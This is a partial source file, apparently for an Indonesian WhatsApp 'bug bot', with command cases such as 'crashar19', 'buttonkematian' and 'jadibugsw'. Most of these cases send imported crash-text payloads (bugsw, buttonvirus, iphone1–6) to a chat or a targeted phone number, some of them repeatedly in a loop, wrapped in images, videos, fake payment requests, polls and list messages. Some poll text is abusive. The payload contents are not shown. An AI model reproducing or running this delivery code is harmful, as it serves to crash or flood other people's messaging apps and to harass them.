...
const { bugsw } = require('./DataBoss/virtex/bugsw')
...
const Bacot = { url: 'https://telegra.ph/file/1fe23701e5a68b5e73bac.jpg' }
...
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./DataBoss/lib/register')
const _registered = JSON.parse(fs.readFileSync('./DataBoss/dbnye/registered.json'));
const register = JSON.parse(fs.readFileSync('./DataBoss/dbnye/register.json'));
...
// Target
const reply = (teks) => {
return BossRaehan.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝗦𝗖 𝗥𝗔𝗘𝗛𝗔𝗡𝟭𝟵𝟴𝟲`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": Mthumb,"sourceUrl": `https://youtube.com/channel/UCnQANmWo4iOyC6q6psb5eVg`}}}, { quoted: m })
} 
...
┃╔══════[ VERIFIKASI ]══════⊱
┃╠➤ Haii 👋 Kak ${pushname} 
┃╠➤ Selamat ${salam} Aku Adalah Bot Raehan
┃╠➤ Silahkan Ketik
┃╠➤ [ Verifikasi ] 
...
BossRaehan.sendMessage(m.chat, anakau, {quoted: Raehan})
}
...
BossRaehan.sendMessage(m.chat, anu, {quoted: Raehan})
}             
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone1}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone2}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone3}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone4}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone5}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${iphone6}` }, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${buttonhan}` }, { quoted: doc })
}
}
break
case 'jadivirtext9': {
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${buttonvirus}` }, { quoted: doc })
}
}
break
case 'jadivirtext10': {
...
let teks = `${q}`
{
BossRaehan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7b8b904ecabdbe0744635.jpg' }, caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
...
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: Mthumb, }, { upload: BossRaehan.waUploadToServer })
...
"options": [
	{
"optionName": ` ${teks}ANJING`
	},
	{
"optionName": `VOTE ${teks} JANGAN LARI BANGST`
	}
],
...
ydd = `Yooo...Iam SU`
for (let i = 0; i < jumlah; i++) {
BossRaehan.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonhan}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °ooo°͢`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonhan}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@RAEHAN1986`,
thumbnailUrl: 'https://telegra.ph/file/1fe23701e5a68b5e73bac.jpg', 
}
}}}}}, { quoted:doc})
}
}
...
let teks = `${q}`
{
BossRaehan.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonhan}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °han°͢`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonhan}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@RAEHAN1986`,
thumbnailUrl: 'https://telegra.ph/file/1fe23701e5a68b5e73bac.jpg', 
}
...
BossRaehan.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `🔥 ${teks} ${bugsw}` }, { quoted: doc })
}
}
break
case 'jadibugsw': {
...
{
joau = Mthumb,
BossRaehan.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonhan}` }, { quoted: doc })
}
}
break
case 'jadibugbutton':
...
BossRaehan.sendMessage(m.chat, buttonnnnmMessage)
}
 break

case 'hanpoll': case 'hanjhon2': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
{
"optionName": "SALAM BROTHER BY © °han°͢"
}
],
...
break
case 'hantroli2': case 'hantrol': case 'jutrol': {
if (!isCreator) return
if (isBan) throw (from)
...
case 'hanstik': case 'hankangbug': case 'buttonkematian': case 'crashar19': {
if (!isCreator) return
if (isBan) throw (from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
touchmebre = [
{
title: `🌷 Han 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Ihi`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay bro`}
]
}
]
BossRaehan.sendListMsg(m.chat, `🌷 Han 🌷`, BossRaehan.user.name, `Hay Kak Sc Bot Raehan Di List`, `Click Here 🌷`, touchmebre, m)
break
...
{
"optionName": "SALAM BROTHER BY © °𝐇𝐚𝐧°͢"
}
],
"selectableOptionsCount": 5
}
...
"options": [
	{
"optionName": "Vote Dong"
	},
	{
"optionName": "Katanya Ram 8"
	},
	{
"optionName": "Brani Vote Ga???"
	},
	{
"optionName": "Salam Brother Raehan 1986"
	}
],
"selectableOptionsCount": 5
	}
...
yy = fs.readFileSync('./DataBoss/sound/p.mp3')
...
if (isBan) throw (from)
 ...
 ilih = fs.readFileSync('./DataBoss/sound/cangkem.mp3')
...
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
BossRaehan.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
BossRaehan.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: Rehan })
}
break
//=================================================//
case 'getvideo': {
...
break
//════════════════════════════//
case 'arahrejeki': case 'arahezeki': {
if (isBan) throw (from)
